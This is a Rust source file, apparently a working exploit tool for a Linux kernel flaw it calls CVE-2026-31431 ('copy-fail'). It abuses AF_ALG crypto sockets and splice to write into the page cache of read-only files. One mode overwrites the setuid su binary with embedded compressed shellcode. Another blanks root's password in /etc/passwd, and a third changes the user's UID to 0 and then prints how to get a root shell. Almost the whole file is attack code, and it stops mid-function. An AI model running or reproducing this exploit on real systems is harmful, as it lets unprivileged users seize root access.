use clap::Parser;
use flate2::read::ZlibDecoder;
use std::ffi::{CString, OsString};
use std::fs::{self, File, OpenOptions};
use std::io::{self, Read, Write};
use std::os::fd::{AsRawFd, FromRawFd, OwnedFd, RawFd};
use std::os::unix::fs::{MetadataExt, OpenOptionsExt, PermissionsExt};
use std::os::unix::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::Command;
use thiserror::Error;

mod cli {
    use super::*;

    #[derive(Debug, Parser)]
    #[command(
        about = "Rust implementation of CVE-2026-31431 (copy-fail). Includes a safe preflight mode for target inspection.",
        after_help = "Use --check to inspect the resolved su target without attempting overwrite or exec."
    )]
    pub struct Cli {
        #[arg(long, help = "path to copy the su binary to before overwriting")]
        pub backup: Option<PathBuf>,
        #[arg(long, help = "command to run as root; full path required")]
        pub exec: Option<PathBuf>,
        #[arg(
            long,
            help = "safe preflight mode: inspect the resolved su target and exit"
        )]
        pub check: bool,
        #[arg(
            long,
            help = "patch /etc/passwd to remove root password via page-cache write"
        )]
        pub escalate: bool,
        #[arg(long, help = "read the new root password from stdin after escalation")]
        pub set_password: bool,
        #[arg(
            long,
            help = "flip current user's UID to 0 in /etc/passwd via page-cache write"
        )]
        pub uid: bool,
    }
}

mod error {
    use super::*;

    #[derive(Debug, Error)]
    pub enum CopyfailError {
        #[error(transparent)]
        Io(#[from] io::Error),
        #[error("invalid payload hex: {0}")]
        InvalidPayloadHex(String),
        #[error("unsupported architecture: {0}")]
        UnsupportedArchitecture(String),
        #[error("syscall failed: {call}: {source}")]
        Syscall {
            call: &'static str,
            source: io::Error,
        },
        #[error("required AF_ALG crypto algorithm is unavailable: {algorithm}. Load the kernel crypto modules (for example authenc/authencesn, hmac, sha256, cbc, aes) or use a kernel that registers this algorithm")]
        MissingCryptoAlgorithm { algorithm: &'static str },
        #[error("su binary not found")]
        SuNotFound,
        #[error("payload decompression failed: {0}")]
        PayloadDecompression(String),
        #[error("payload lookup failed: {0}")]
        PayloadLookup(String),
        #[error("invalid path for syscall: {0:?}")]
        InvalidPath(PathBuf),
        #[error("short splice from target file")]
        ShortSplice,
        #[error("failed to open stdin for child process")]
        ChildStdinUnavailable,
    }

    pub type Result<T> = std::result::Result<T, CopyfailError>;
}

mod payloads {
    use super::error::{CopyfailError, Result};
    use super::*;

    const PAYLOADS_AMD64: &str = "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c00111d10d3";
    const PAYLOADS_386: &str = "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858";
    const PAYLOADS_ARM64: &str = "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578";
    const EXEC_ARGV1_AMD64: &str = "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e02e5c1680601086578c0f0ff864c7e568fee1a1501c36f59d61133f9590dff67d944f0b3020082b00eaf";
    const EXEC_ARGV1_386: &str = "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40381fc80461569098000383e101c3db1bae9e6de88e51e1303c99c51d31f36c83e1ed2cc688b30d001bf41180";
    const EXEC_ARGV1_ARM64: &str = "789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd04ca5b029787e96cb8e421d47009c8bbf280dbe1272390cf04c42ba4216220f915dc103600d72b1509";

    fn decode_hex(hex: &str) -> Result<Vec<u8>> {
        if !hex.len().is_multiple_of(2) {
            return Err(CopyfailError::InvalidPayloadHex(
                "odd-length hex string".into(),
            ));
        }
        let mut out = Vec::with_capacity(hex.len() / 2);
        let bytes = hex.as_bytes();
        for idx in (0..bytes.len()).step_by(2) {
            let pair = std::str::from_utf8(&bytes[idx..idx + 2])
                .map_err(|e| CopyfailError::InvalidPayloadHex(e.to_string()))?;
            let value = u8::from_str_radix(pair, 16)
                .map_err(|e| CopyfailError::InvalidPayloadHex(e.to_string()))?;
            out.push(value);
        }
        Ok(out)
    }

    fn decompress_payload(zlib_bytes: &[u8]) -> Result<Vec<u8>> {
        let mut decoder = ZlibDecoder::new(zlib_bytes);
        let mut payload = Vec::new();
        decoder
            .read_to_end(&mut payload)
            .map_err(|e| CopyfailError::PayloadDecompression(e.to_string()))?;
        Ok(payload)
    }

    fn payload_hex_for_arch(arch: &str, exec_mode: bool) -> Result<&'static str> {
        match (arch, exec_mode) {
            ("x86_64" | "amd64", false) => Ok(PAYLOADS_AMD64),
            ("x86" | "i386" | "i586" | "i686" | "386", false) => Ok(PAYLOADS_386),
            ("aarch64" | "arm64", false) => Ok(PAYLOADS_ARM64),
            ("x86_64" | "amd64", true) => Ok(EXEC_ARGV1_AMD64),
            ("x86" | "i386" | "i586" | "i686" | "386", true) => Ok(EXEC_ARGV1_386),
            ("aarch64" | "arm64", true) => Ok(EXEC_ARGV1_ARM64),
            _ => Err(CopyfailError::UnsupportedArchitecture(arch.to_string())),
        }
    }

    pub fn payload_for_arch(arch: &str, exec_mode: bool) -> Result<Vec<u8>> {
        let hex = payload_hex_for_arch(arch, exec_mode)?;
        let zlib = decode_hex(hex)?;
        decompress_payload(&zlib)
    }

    pub fn payload_for_current_arch(exec_mode: bool) -> Result<Vec<u8>> {
        payload_for_arch(std::env::consts::ARCH, exec_mode)
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        #[test]
        fn payload_lookup_supported_arches() {
            assert!(payload_hex_for_arch("x86_64", false).is_ok());
            assert!(payload_hex_for_arch("amd64", true).is_ok());
            assert!(payload_hex_for_arch("aarch64", false).is_ok());
        }

        #[test]
        fn payload_lookup_unsupported_arch() {
            assert!(matches!(
                payload_for_arch("mips64", false),
                Err(CopyfailError::UnsupportedArchitecture(_))
            ));
        }

        #[test]
        fn decompressed_payload_is_non_empty() {
            assert!(!payload_for_arch("x86_64", false).unwrap().is_empty());
            assert!(!payload_for_arch("x86_64", true).unwrap().is_empty());
        }
    }
}

mod su {
    use super::error::{CopyfailError, Result};
    use super::*;

    pub fn resolve_su() -> Result<PathBuf> {
        resolve_su_from("/usr/bin/su", std::env::var_os("PATH"))
    }

    fn resolve_su_from(preferred: &str, path_env: Option<OsString>) -> Result<PathBuf> {
        let preferred_path = PathBuf::from(preferred);
        if preferred_path.exists() {
            return Ok(preferred_path);
        }

        let path_env = path_env.ok_or(CopyfailError::SuNotFound)?;
        for entry in std::env::split_paths(&path_env) {
            let candidate = entry.join("su");
            if candidate.exists() {
                return Ok(candidate);
            }
        }
        Err(CopyfailError::SuNotFound)
    }

    pub fn backup_su_binary(src: &Path, dst: &Path) -> Result<()> {
        let metadata = fs::metadata(src)?;
        let contents = fs::read(src)?;
        let mut out = OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .mode(0o600)
            .open(dst)?;
        io::Write::write_all(&mut out, &contents)?;
        out.sync_all()?;

        let mode = metadata.permissions().mode();
        fs::set_permissions(dst, fs::Permissions::from_mode(mode))?;

        let times = [
            libc::timespec {
                tv_sec: metadata.atime(),
                tv_nsec: metadata.atime_nsec() as _,
            },
            libc::timespec {
                tv_sec: metadata.mtime(),
                tv_nsec: metadata.mtime_nsec() as _,
            },
        ];
        let path_c = CString::new(dst.as_os_str().as_encoded_bytes())
            .map_err(|_| CopyfailError::InvalidPath(dst.to_path_buf()))?;
        let rc = unsafe { libc::utimensat(libc::AT_FDCWD, path_c.as_ptr(), times.as_ptr(), 0) };
        if rc != 0 {
            return Err(CopyfailError::Syscall {
                call: "utimensat",
                source: io::Error::last_os_error(),
            });
        }
        Ok(())
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        fn temp_dir(name: &str) -> PathBuf {
            let path =
                std::env::temp_dir().join(format!("copyfail-rs-{name}-{}", std::process::id()));
            let _ = fs::remove_dir_all(&path);
            fs::create_dir_all(&path).unwrap();
            path
        }

        #[test]
        fn resolve_prefers_usr_bin_su() {
            let dir = temp_dir("resolve-prefers");
            let preferred = dir.join("usr-bin-su");
            fs::write(&preferred, b"x").unwrap();
            let found = resolve_su_from(preferred.to_str().unwrap(), None).unwrap();
            assert_eq!(found, preferred);
        }

        #[test]
        fn resolve_falls_back_to_path() {
            let dir = temp_dir("resolve-path");
            let bin = dir.join("bin");
            fs::create_dir_all(&bin).unwrap();
            let su = bin.join("su");
            fs::write(&su, b"x").unwrap();
            let found =
                resolve_su_from("/nonexistent/su", Some(OsString::from(bin.as_os_str()))).unwrap();
            assert_eq!(found, su);
        }

        #[test]
        fn backup_preserves_mode_and_contents() {
            let dir = temp_dir("backup");
            let src = dir.join("src-su");
            let dst = dir.join("dst-su");
            fs::write(&src, b"payload").unwrap();
            fs::set_permissions(&src, fs::Permissions::from_mode(0o4755)).unwrap();
            backup_su_binary(&src, &dst).unwrap();
            assert_eq!(fs::read(&dst).unwrap(), b"payload");
            let mode = fs::metadata(&dst).unwrap().permissions().mode() & 0o7777;
            assert_eq!(mode, 0o4755);
        }
    }
}

mod exploit {
    use super::error::{CopyfailError, Result};
    use super::*;
    use libc::{c_void, cmsghdr, msghdr, sockaddr, sockaddr_alg, socklen_t};
    use std::mem::{size_of, zeroed};
    use std::ptr;

    pub const SOL_ALG: i32 = 279;
    pub const ALG_SET_KEY: i32 = 1;
    pub const ALG_SET_IV: i32 = 2;
    pub const ALG_SET_OP: i32 = 3;
    pub const ALG_SET_AEAD_ASSOCLEN: i32 = 4;
    pub const ALG_SET_AEAD_AUTHSIZE: i32 = 5;
    const ALG_OP_DECRYPT: u32 = 0;
    const AF_ALG_NAME: &[u8] = b"authencesn(hmac(sha256),cbc(aes))\0";
    const AF_ALG_TYPE: &[u8] = b"aead\0";

    fn cmsg_align(len: usize) -> usize {
        let align = size_of::<usize>();
        (len + align - 1) & !(align - 1)
    }

    fn cmsg_len(data_len: usize) -> usize {
        cmsg_align(size_of::<cmsghdr>()) + data_len
    }

    fn cmsg_space(data_len: usize) -> usize {
        cmsg_align(size_of::<cmsghdr>()) + cmsg_align(data_len)
    }

    pub fn pack_cmsg(level: i32, typ: i32, data: &[u8]) -> Vec<u8> {
        let mut buffer = vec![0u8; cmsg_space(data.len())];
        let header = buffer.as_mut_ptr() as *mut cmsghdr;
        unsafe {
            (*header).cmsg_level = level;
            (*header).cmsg_type = typ;
            (*header).cmsg_len = cmsg_len(data.len()) as _;
            ptr::copy_nonoverlapping(
                data.as_ptr(),
                buffer.as_mut_ptr().add(cmsg_align(size_of::<cmsghdr>())),
                data.len(),
            );
        }
        buffer
    }

    fn build_oob() -> Vec<u8> {
        let mut oob = Vec::new();
        oob.extend(pack_cmsg(
            SOL_ALG,
            ALG_SET_OP,
            &ALG_OP_DECRYPT.to_ne_bytes(),
        ));
        let mut iv = vec![0x10u8];
        iv.extend([0u8; 19]);
        oob.extend(pack_cmsg(SOL_ALG, ALG_SET_IV, &iv));
        oob.extend(pack_cmsg(
            SOL_ALG,
            ALG_SET_AEAD_ASSOCLEN,
            &8u32.to_ne_bytes(),
        ));
        oob
    }

    fn build_msg_data(chunk: &[u8]) -> Vec<u8> {
        let mut data = Vec::with_capacity(4 + chunk.len());
        data.extend_from_slice(b"AAAA");
        data.extend_from_slice(chunk);
        data
    }

    fn key_bytes() -> Vec<u8> {
        let mut key = vec![0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10];
        key.extend(std::iter::repeat_n(0u8, 32));
        key
    }

    fn chunk_end(start: usize, total: usize) -> usize {
        (start + 4).min(total)
    }

    fn progress_interval(total: usize) -> usize {
        if total < 10_000 {
            100
        } else {
            10_000
        }
    }

    fn create_alg_socket() -> Result<OwnedFd> {
        let fd = unsafe { libc::socket(libc::AF_ALG, libc::SOCK_SEQPACKET, 0) };
        if fd < 0 {
            return Err(CopyfailError::Syscall {
                call: "socket",
                source: io::Error::last_os_error(),
            });
        }
        Ok(unsafe { OwnedFd::from_raw_fd(fd) })
    }

    fn bind_error(err: io::Error) -> CopyfailError {
        if err.raw_os_error() == Some(libc::ENOENT) {
            return CopyfailError::MissingCryptoAlgorithm {
                algorithm: "authencesn(hmac(sha256),cbc(aes))",
            };
        }
        CopyfailError::Syscall {
            call: "bind",
            source: err,
        }
    }

    fn bind_socket(fd: RawFd) -> Result<()> {
        let mut sa: sockaddr_alg = unsafe { zeroed() };
        sa.salg_family = libc::AF_ALG as u16;
        sa.salg_feat = 0;
        sa.salg_mask = 0;
        sa.salg_type[..AF_ALG_TYPE.len()].copy_from_slice(AF_ALG_TYPE);
        sa.salg_name[..AF_ALG_NAME.len()].copy_from_slice(AF_ALG_NAME);
        let rc = unsafe {
            libc::bind(
                fd,
                &sa as *const sockaddr_alg as *const sockaddr,
                size_of::<sockaddr_alg>() as socklen_t,
            )
        };
        if rc != 0 {
            return Err(bind_error(io::Error::last_os_error()));
        }
        Ok(())
    }

    fn set_key(fd: RawFd, key: &[u8]) -> Result<()> {
        let rc = unsafe {
            libc::setsockopt(
                fd,
                SOL_ALG,
                ALG_SET_KEY,
                key.as_ptr() as *const c_void,
                key.len() as socklen_t,
            )
        };
        if rc != 0 {
            return Err(CopyfailError::Syscall {
                call: "setsockopt(ALG_SET_KEY)",
                source: io::Error::last_os_error(),
            });
        }
        Ok(())
    }

    fn set_authsize(fd: RawFd, authsize: u32) -> Result<()> {
        let rc = unsafe {
            libc::setsockopt(
                fd,
                SOL_ALG,
                ALG_SET_AEAD_AUTHSIZE,
                &authsize as *const u32 as *const c_void,
                size_of::<u32>() as socklen_t,
            )
        };
        if rc != 0 {
            return Err(CopyfailError::Syscall {
                call: "setsockopt(ALG_SET_AEAD_AUTHSIZE)",
                source: io::Error::last_os_error(),
            });
        }
        Ok(())
    }

    fn accept_alg(fd: RawFd) -> Result<OwnedFd> {
        let new_fd = unsafe { libc::accept4(fd, ptr::null_mut(), ptr::null_mut(), 0) };
        if new_fd < 0 {
            return Err(CopyfailError::Syscall {
                call: "accept4",
                source: io::Error::last_os_error(),
            });
        }
        Ok(unsafe { OwnedFd::from_raw_fd(new_fd) })
    }

    fn sendmsg_with_oob(fd: RawFd, data: &[u8], oob: &[u8]) -> Result<()> {
        let mut iov = libc::iovec {
            iov_base: data.as_ptr() as *mut c_void,
            iov_len: data.len(),
        };
        let mut hdr: msghdr = unsafe { zeroed() };
        hdr.msg_iov = &mut iov;
        hdr.msg_iovlen = 1;
        hdr.msg_control = oob.as_ptr() as *mut c_void;
        hdr.msg_controllen = oob.len() as _;
        let rc = unsafe { libc::sendmsg(fd, &hdr, libc::MSG_MORE) };
        if rc < 0 {
            return Err(CopyfailError::Syscall {
                call: "sendmsg",
                source: io::Error::last_os_error(),
            });
        }
        Ok(())
    }

    fn create_pipe() -> Result<(OwnedFd, OwnedFd)> {
        let mut fds = [0; 2];
        let rc = unsafe { libc::pipe(fds.as_mut_ptr()) };
        if rc != 0 {
            return Err(CopyfailError::Syscall {
                call: "pipe",
                source: io::Error::last_os_error(),
            });
        }
        Ok((unsafe { OwnedFd::from_raw_fd(fds[0]) }, unsafe {
            OwnedFd::from_raw_fd(fds[1])
        }))
    }

    fn splice_once(
        src: RawFd,
        off_in: Option<&mut libc::loff_t>,
        dst: RawFd,
        off_out: Option<&mut libc::loff_t>,
        len: usize,
    ) -> Result<isize> {
        let rc = unsafe {
            libc::splice(
                src,
                off_in.map_or(ptr::null_mut(), |v| v as *mut _),
                dst,
                off_out.map_or(ptr::null_mut(), |v| v as *mut _),
                len,
                0,
            )
        };
        if rc < 0 {
            return Err(CopyfailError::Syscall {
                call: "splice",
                source: io::Error::last_os_error(),
            });
        }
        Ok(rc)
    }

    pub fn overwrite_chunk(file: &File, offset: usize, chunk: &[u8]) -> Result<()> {
        // Pre-read the target page so the later splice observes cached data.
        let mut prebuf = [0u8; 4096];
        let page_start = (offset & !4095) as libc::off_t;
        unsafe {
            let _ = libc::pread(
                file.as_raw_fd(),
                prebuf.as_mut_ptr() as *mut c_void,
                prebuf.len(),
                page_start,
            );
        }

        let sock = create_alg_socket()?;
        bind_socket(sock.as_raw_fd())?;
        set_key(sock.as_raw_fd(), &key_bytes())?;
        set_authsize(sock.as_raw_fd(), 4)?;
        let op_sock = accept_alg(sock.as_raw_fd())?;

        let oob = build_oob();
        let msg_data = build_msg_data(chunk);
        sendmsg_with_oob(op_sock.as_raw_fd(), &msg_data, &oob)?;

        // Splice a small window from the target offset; large windows may fail with EINVAL.
        let splice_len = 32usize;
        let mut file_off = offset as libc::loff_t;
        let (pipe_r, pipe_w) = create_pipe()?;
        let spliced = splice_once(
            file.as_raw_fd(),
            Some(&mut file_off),
            pipe_w.as_raw_fd(),
            None,
            splice_len,
        )?;
        if spliced <= 0 || spliced < chunk.len() as isize {
            return Err(CopyfailError::ShortSplice);
        }
        splice_once(
            pipe_r.as_raw_fd(),
            None,
            op_sock.as_raw_fd(),
            None,
            spliced as usize,
        )?;

        let mut buf = vec![0u8; 8 + offset];
        let rc = unsafe {
            libc::read(
                op_sock.as_raw_fd(),
                buf.as_mut_ptr() as *mut c_void,
                buf.len(),
            )
        };
        // EBADMSG/EINVAL expected — HMAC verification always fails with the dummy key,
        // but the page-cache write is already committed during splice.
        if rc < 0 {
            let err = io::Error::last_os_error();
            let errno = err.raw_os_error().unwrap_or(0);
            if errno != libc::EBADMSG && errno != libc::EINVAL {
                return Err(CopyfailError::Syscall {
                    call: "read",
                    source: err,
                });
            }
        }
        Ok(())
    }

    pub fn overwrite_file(file: &File, payload: &[u8]) -> Result<()> {
        for start in (0..payload.len()).step_by(4) {
            let end = chunk_end(start, payload.len());
            overwrite_chunk(file, start, &payload[start..end])?;
            let interval = progress_interval(payload.len());
            if start % interval == 0 {
                eprintln!("  ... wrote {} bytes", end);
            }
        }
        if !payload.is_empty() {
            eprintln!("  ... wrote {} bytes", payload.len());
        }
        Ok(())
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        #[test]
        fn bind_enoent_reports_missing_algorithm() {
            let err = bind_error(io::Error::from_raw_os_error(libc::ENOENT));
            assert!(matches!(err, CopyfailError::MissingCryptoAlgorithm { .. }));
        }

        #[test]
        fn packed_cmsg_has_header_and_payload() {
            let payload = [1u8, 2, 3, 4];
            let buf = pack_cmsg(SOL_ALG, ALG_SET_OP, &payload);
            assert!(!buf.is_empty());
            assert!(buf.len() >= cmsg_len(payload.len()));
            assert!(buf.windows(payload.len()).any(|window| window == payload));
        }

        #[test]
        fn build_oob_is_non_empty_and_contains_expected_segments() {
            let oob = build_oob();
            assert!(!oob.is_empty());
            assert!(oob.len() >= cmsg_space(4) + cmsg_space(20) + cmsg_space(4));
        }

        #[test]
        fn chunk_helpers_behave() {
            assert_eq!(chunk_end(0, 10), 4);
            assert_eq!(chunk_end(8, 10), 10);
            assert_eq!(progress_interval(9999), 100);
            assert_eq!(progress_interval(10_000), 10_000);
            assert_eq!(build_msg_data(&[9, 8, 7]), b"AAAA\x09\x08\x07");
        }
    }
}

mod escalate {
    use super::error::{CopyfailError, Result};
    use super::exploit;
    use std::fs::{self, File, OpenOptions};
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;

    const BACKUP_PATH: &str = "/tmp/.passwd.bak";
    const PASSWD_PATH: &str = "/etc/passwd";

    fn find_root_line(content: &[u8]) -> Result<usize> {
        let needle = b"\nroot:";
        // Search for "\nroot:" to find the start of the root line
        if let Some(pos) = content.windows(needle.len()).position(|w| w == needle) {
            return Ok(pos + 1); // skip the leading \n
        }
        // root might be the very first line (no leading \n)
        if content.starts_with(b"root:") {
            return Ok(0);
        }
        Err(CopyfailError::PayloadLookup(
            "root not found in /etc/passwd".into(),
        ))
    }

    fn patch_root_line(line: &[u8]) -> Result<Vec<u8>> {
        let fields: Vec<&[u8]> = line.split(|&b| b == b':').collect();
        if fields.len() < 7 {
            return Err(CopyfailError::PayloadLookup(
                "unexpected /etc/passwd field count".into(),
            ));
        }
        if fields[1].is_empty() {
            eprintln!("[*] root already has no password.");
            return Ok(line.to_vec());
        }

        let old_pw = fields[1];
        let mut new_fields: Vec<Vec<u8>> = fields.iter().map(|f| f.to_vec()).collect();
        new_fields[1] = b"".to_vec();
        // Compensate: add spaces to comment field (index 4) to keep line length identical
        new_fields[4].extend(std::iter::repeat_n(b' ', old_pw.len()));

        let sep: &[u8] = b":";
        let new_line = new_fields.join(sep);
        assert_eq!(
            new_line.len(),
            line.len(),
            "length mismatch: {} vs {}",
            new_line.len(),
            line.len()
        );
        Ok(new_line)
    }

    pub fn run() -> Result<()> {
        eprintln!("[*] CVE-2026-31431 — Copy Fail");
        eprintln!("[*] Mode: remove root password via /etc/passwd");
        eprintln!();

        let content = fs::read(PASSWD_PATH).map_err(CopyfailError::Io)?;

        // Backup
        let mut backup = OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .mode(0o600)
            .open(BACKUP_PATH)
            .map_err(CopyfailError::Io)?;
        backup.write_all(&content).map_err(CopyfailError::Io)?;
        backup.sync_all().map_err(CopyfailError::Io)?;
        eprintln!("[*] Backup: {BACKUP_PATH}");

        let line_offset = find_root_line(&content)?;
        let line_end = content[line_offset..]
            .iter()
            .position(|&b| b == b'\n')
            .map(|p| line_offset + p)
            .unwrap_or(content.len());
        let line = &content[line_offset..line_end];

        let new_line = patch_root_line(line)?;

        eprintln!("[*] Before: {}", String::from_utf8_lossy(line));
        eprintln!("[*] After:  {}", String::from_utf8_lossy(&new_line));
        eprintln!("[*] Offset: {line_offset}");
        eprintln!();

        // Write via page-cache exploit
        let file = File::open(PASSWD_PATH).map_err(CopyfailError::Io)?;
        let mut pos = 0;
        while pos < new_line.len() {
            let end = (pos + 4).min(new_line.len());
            let mut chunk = new_line[pos..end].to_vec();
            // Pad last chunk to 4 bytes with original content
            if chunk.len() < 4 {
                let tail_off = line_offset + pos + chunk.len();
                let remaining = 4 - chunk.len();
                if tail_off + remaining <= content.len() {
                    chunk.extend_from_slice(&content[tail_off..tail_off + remaining]);
                } else {
                    chunk.extend(std::iter::repeat_n(0u8, remaining));
                }
            }
            let file_off = line_offset + pos;
            let ascii: String = chunk
                .iter()
                .map(|&b| {
                    if (32..127).contains(&b) {
                        b as char
                    } else {
                        '.'
                    }
                })
                .collect();
            let hex_str: String = chunk.iter().map(|b| format!("{b:02x}")).collect();
            eprintln!("    [0x{file_off:06x}]  {hex_str}  {ascii}");
            exploit::overwrite_chunk(&file, file_off, &chunk)?;
            pos += 4;
        }

        // Verify
        let verify = fs::read(PASSWD_PATH).map_err(CopyfailError::Io)?;
        let patched = &verify[line_offset..line_offset + new_line.len()];
        if patched.starts_with(b"root::0:0:") {
            eprintln!();
            eprintln!("[+] Success: {}", String::from_utf8_lossy(patched));
            Ok(())
        } else {
            eprintln!();
            eprintln!("[-] Failed: {}", String::from_utf8_lossy(patched));
            Err(CopyfailError::PayloadLookup(
                "verification failed after write".into(),
            ))
        }
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        #[test]
        fn find_root_line_at_start() {
            let content =
                b"root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000::/home/user:/bin/bash\n";
            assert_eq!(find_root_line(content).unwrap(), 0);
        }

        #[test]
        fn find_root_line_after_other() {
            let content = b"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nroot:x:0:0:root:/root:/bin/bash\n";
            assert_eq!(find_root_line(content).unwrap(), 48);
        }

        #[test]
        fn find_root_line_missing() {
            let content = b"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n";
            assert!(find_root_line(content).is_err());
        }

        #[test]
        fn patch_removes_password_and_preserves_length() {
            let line = b"root:x:0:0:root:/root:/bin/bash";
            let patched = patch_root_line(line).unwrap();
            assert_eq!(patched.len(), line.len());
            assert!(patched.starts_with(b"root::0:0:"));
        }

        #[test]
        fn patch_idempotent_when_already_empty() {
            let line = b"root::0:0:root:/root:/bin/bash";
            let patched = patch_root_line(line).unwrap();
            assert_eq!(patched, line);
        }

        #[test]
        fn patch_preserves_colon_separated_structure() {
            let line = b"root:x:0:0:root:/root:/bin/bash";
            let patched = patch_root_line(line).unwrap();
            let fields: Vec<&[u8]> = patched.split(|&b| b == b':').collect();
            assert_eq!(fields.len(), 7);
            assert_eq!(fields[0], b"root");
            assert_eq!(fields[1], b"");
            assert_eq!(fields[2], b"0");
            assert_eq!(fields[3], b"0");
        }
    }
}

mod uid_flip {
    use super::error::{CopyfailError, Result};
    use super::exploit;
    use std::fs;

    const PASSWD_PATH: &str = "/etc/passwd";

    fn find_user_uid_field(content: &[u8], username: &[u8]) -> Result<(usize, usize)> {
        let needle = [username, b":"].concat();
        let mut line_start = 0;
        while line_start < content.len() {
            if content[line_start..].starts_with(&needle) {
                // username:password:uid:gid:...
                //                   ^   we need this
                let j = line_start + needle.len();
                let colon1 = content[j..]
                    .iter()
                    .position(|&b| b == b':')
                    .map(|p| j + p)
                    .ok_or_else(|| {
                        CopyfailError::PayloadLookup("no colon after password field".into())
                    })?;
                let uid_off = colon1 + 1;
                let uid_end = content[uid_off..]
                    .iter()
                    .position(|&b| b == b':')
                    .map(|p| uid_off + p)
                    .ok_or_else(|| {
                        CopyfailError::PayloadLookup("no colon after uid field".into())
                    })?;
                return Ok((uid_off, uid_end));
            }
            let nl = content[line_start..]
                .iter()
                .position(|&b| b == b'\n')
                .map(|p| line_start + p + 1);
            match nl {
                Some(next) => line_start = next,
                None => break,
            }
        }
        Err(CopyfailError::PayloadLookup(format!(
            "user {} not found in /etc/passwd",
            String::from_utf8_lossy(username)
        )))
    }

    pub fn run() -> Result<String> {
        let uid = unsafe { libc::getuid() };
        let username = unsafe {
            let pw = libc::getpwuid(uid);
            if pw.is_null() {
                return Err(CopyfailError::PayloadLookup("getpwuid failed".into()));
            }
            std::ffi::CStr::from_ptr((*pw).pw_name).to_bytes().to_vec()
        };

        eprintln!("[*] CVE-2026-31431 — Copy Fail (UID flip)");
        eprintln!(
            "[*] user={} uid={}",
            String::from_utf8_lossy(&username),
            uid
        );
        eprintln!();

        let content = fs::read(PASSWD_PATH).map_err(CopyfailError::Io)?;

        let (uid_off, uid_end) = find_user_uid_field(&content, &username)?;
        let uid_str = &content[uid_off..uid_end];
        eprintln!(
            "[*] /etc/passwd: {} UID field at offset {} = {:?}",
            String::from_utf8_lossy(&username),
            uid_off,
            String::from_utf8_lossy(uid_str),
        );

        if uid_str.len() != 4 {
            return Err(CopyfailError::PayloadLookup(format!(
                "UID {:?} is {} chars; this technique needs a 4-digit UID (1000-9999)",
                String::from_utf8_lossy(uid_str),
                uid_str.len(),
            )));
        }

        eprintln!(
            "[*] Patching {:?} -> \"0000\" in page cache...",
            String::from_utf8_lossy(uid_str)
        );

        let file = fs::File::open(PASSWD_PATH).map_err(CopyfailError::Io)?;
        exploit::overwrite_chunk(&file, uid_off, b"0000")?;

        // Verify
        let verify = fs::read(PASSWD_PATH).map_err(CopyfailError::Io)?;
        let landed = &verify[uid_off..uid_off + 4];
        eprintln!(
            "[*] Page cache now reads {:?} at offset {}",
            String::from_utf8_lossy(landed),
            uid_off
        );

        if landed != b"0000" {
            eprintln!("[!] Patch did not land. Kernel may be patched.");
            return Err(CopyfailError::PayloadLookup(
                "verification failed after write".into(),
            ));
        }

        // Verify via getpwuid
        let check_uid = unsafe {
            let pw = libc::getpwuid(uid);
            if pw.is_null() {
                uid
            } else {
                (*pw).pw_uid
            }
        };
        eprintln!("[*] getpwuid({uid}).pw_uid = {check_uid}",);

        let username = String::from_utf8_lossy(&username).into_owned();
        eprintln!();
        eprintln!("[+] /etc/passwd page cache now lists {username} as UID 0.");
        eprintln!("[+] Run:   su {username}");
        eprintln!("[+] Enter your own password. su will setuid(0) and drop a root shell.");
        eprintln!();
        eprintln!("[i] Cleanup after testing:");
        eprintln!("[i]   echo 3 > /proc/sys/vm/drop_caches");

        Ok(username)
    }

    #[cfg(test)]
    mod tests {
        use super::find_user_uid_field;

        #[test]
        fn find_root_uid_field() {
            let content =
                b"root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000::/home/user:/bin/bash\n";
            let (off, end) = find_user_uid_field(content, b"root").unwrap();
            assert_eq!(&content[off..end], b"0");
        }

        #[test]
        fn find_user_uid_4digit() {
            let content =
                b"root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000::/home/user:/bin/bash\n";
            let (off, end) = find_user_uid_field(content, b"user").unwrap();
            assert_eq!(&content[off..end], b"1000");
        }

        #[test]
        fn find_user_not_found() {
            let content = b"root:x:0:0:root:/root:/bin/bash\n";
            assert!(find_user_uid_field(content, b"nobody").is_err());
        }
    }
}

use cli::Cli;
use error::Result;

fn format_mode_bits(mode: u32) -> String {
    format!("{:04o}", mode & 0o7777)
}

fn inspect_su_target(path: &Path) -> Result<String> {
    let symlink_meta = fs::symlink_metadata(path)?;
    let metadata = fs::metadata(path)?;
    let file_type = if symlink_meta.file_type().is_symlink() {
        "symlink"
    } else if symlink_meta.file_type().is_file() {
        "regular file"
    } else {
        "other"
    };
    let symlink_target = if symlink_meta.file_type().is_symlink() {
        Some(fs::read_link(path)?)
    } else {
        None
    };
    let readonly_open = File::open(path).is_ok();
    let setuid = metadata.mode() & 0o4000 != 0;
    let alpine_busybox_hint = symlink_target
        .as_ref()
        .map(|target| target == Path::new("/bin/bbsuid"))
        .unwrap_or(false)
        && metadata.mode() & 0o7777 == 0o4111;

    let mut lines = vec![
        "Safe preflight/check mode: no overwrite or exec attempted.".to_string(),
        format!("Resolved su path: {}", path.display()),
        format!("Path type: {file_type}"),
    ];

    if let Some(target) = symlink_target {
